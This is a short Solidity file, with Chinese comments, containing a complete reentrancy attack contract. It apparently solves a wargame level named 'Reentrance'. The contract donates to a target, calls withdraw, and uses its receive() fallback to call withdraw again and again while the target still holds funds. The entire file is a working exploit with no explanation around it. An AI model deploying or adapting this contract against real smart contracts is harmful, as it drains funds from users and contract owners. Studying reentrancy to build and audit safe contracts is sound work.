// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyAttack {
    IReentrance target;
    uint amount = 0.00072 ether; // 根據你初始捐贈的量

    constructor(address _target) {
        target = IReentrance(_target);
    }

    function attack() external payable {
        // 1. 先捐贈，讓自己在 balances 裡有記錄
        target.donate{value: msg.value}(address(this));
        // 2. 開始第一次提款
        target.withdraw(msg.value);
    }

    receive() external payable {
        // 3. 核心：重入邏輯
        uint targetBalance = address(target).balance;
        if (targetBalance >= amount) {
            target.withdraw(amount);
        }
    }
}